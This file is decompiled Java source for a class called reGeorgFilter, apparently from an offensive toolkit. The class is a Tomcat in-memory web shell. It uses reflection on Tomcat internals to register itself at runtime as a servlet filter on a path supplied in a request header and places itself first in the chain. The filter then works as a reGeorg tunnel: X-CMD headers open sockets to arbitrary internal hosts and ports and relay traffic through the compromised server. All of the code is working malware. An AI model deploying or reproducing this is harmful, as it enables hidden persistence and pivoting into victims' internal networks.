//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.summersec.x;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.EnumSet;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.FilterRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

public class reGeorgFilter implements Filter {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String path = "/favicondemo.ico";

    public reGeorgFilter() {
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        String filterName = this.path;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            Dynamic filterRegistration = null;

            String var11;
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[])null);
                stateField.set(standardContext, LifecycleState.STARTED);
                var11 = null;

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }

                String var25 = "Success";
                return var25;
            } catch (Exception var22) {
                var11 = var22.getMessage();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return var11;
        } else {
            return "Filter already exists";
        }
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)req;
        HttpServletResponse response = (HttpServletResponse)resp;
        HttpSession session = request.getSession();

        try {
            String cmd = request.getHeader("X-CMD");
            if (cmd != null) {
                response.setHeader("X-STATUS", "OK");
                int readlen;
                if (cmd.compareTo("CONNECT") == 0) {
                    try {
                        String target = request.getHeader("X-TARGET");
                        readlen = Integer.parseInt(request.getHeader("X-PORT"));
                        SocketChannel socketChannel = SocketChannel.open();
                        socketChannel.connect(new InetSocketAddress(target, readlen));
                        socketChannel.configureBlocking(false);
                        session.setAttribute("socket", socketChannel);
                        response.setHeader("X-STATUS", "OK");
                    } catch (UnknownHostException var13) {
                        System.out.println(var13.getMessage());
                        response.setHeader("X-ERROR", var13.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    } catch (IOException var14) {
                        System.out.println(var14.getMessage());
                        response.setHeader("X-ERROR", var14.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    }
                } else {
                    SocketChannel socketChannel;
                    if (cmd.compareTo("DISCONNECT") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            socketChannel.socket().close();
                        } catch (Exception var12) {
                            System.out.println(var12.getMessage());
                        }

                        session.invalidate();
                    } else if (cmd.compareTo("READ") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            ByteBuffer buf = ByteBuffer.allocate(512);
                            int bytesRead = socketChannel.read(buf);

                            ServletOutputStream so;
                            for(so = response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                                so.write(buf.array(), 0, bytesRead);
                                so.flush();
                                buf.clear();
                            }

                            response.setHeader("X-STATUS", "OK");
                            so.flush();
                            so.close();
                        } catch (Exception var16) {
                            System.out.println(var16.getMessage());
                            response.setHeader("X-ERROR", var16.getMessage());
                            response.setHeader("X-STATUS", "FAIL");
                        }
                    } else if (cmd.compareTo("FORWARD") == 0) {
                        socketChannel = (SocketChannel)session.getAttribute("socket");

                        try {
                            readlen = request.getContentLength();
                            byte[] buff = new byte[readlen];
                            request.getInputStream().read(buff, 0, readlen);
                            ByteBuffer buf = ByteBuffer.allocate(readlen);
                            buf.clear();
                            buf.put(buff);
                            buf.flip();

                            while(buf.hasRemaining()) {
                                socketChannel.write(buf);
                            }

                            response.setHeader("X-STATUS", "OK");
                        } catch (Exception var15) {
                            System.out.println(var15.getMessage());
                            response.setHeader("X-ERROR", var15.getMessage());
                            response.setHeader("X-STATUS", "FAIL");
                            socketChannel.socket().close();
                        }
                    }
                }
            } else {
                response.getWriter().write("Georg says, 'All seems fine'");
                response.getWriter().flush();
                response.getWriter().close();
            }

        } catch (ClassCastException var17) {
            throw new ServletException("non-HTTP request or response");
        }
    }

    public void destroy() {
    }
}
